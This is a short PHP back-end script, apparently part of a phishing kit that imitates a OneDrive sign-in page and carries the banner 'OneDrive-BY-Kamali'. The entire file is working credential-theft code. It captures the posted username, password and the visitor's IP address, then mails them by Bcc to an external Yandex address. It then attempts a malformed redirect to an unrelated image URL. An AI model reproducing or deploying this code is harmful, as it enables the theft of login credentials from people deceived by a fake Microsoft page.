<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------OneDrive-BY-Kamali-----------------------\n";
$message .= "Username       : ".$_POST['uname']."\n";
$message .= "Password      : ".$_POST['psw']."\n";

$message .= "------------------------IP------------------------------\n";
$message .= "IP                : $ip\n";$IP=$_POST['IP'];
$message .= "--------------OneDrive-BY-Kamali----------------------\n";
$send = "";
$bcc="ceebina05@yandex.com" ;
$subject = "OneDerive".$_POST['email'];
$headers .= $_POST['pass']."\n";



mail($send, $subject, $message, "Bcc: $bcc");


header("https://support.pkware.com/home/sfd/files/latest/16418550/16418549/1/1540330657771/image2016-9-27+15%3A22%3A18.png");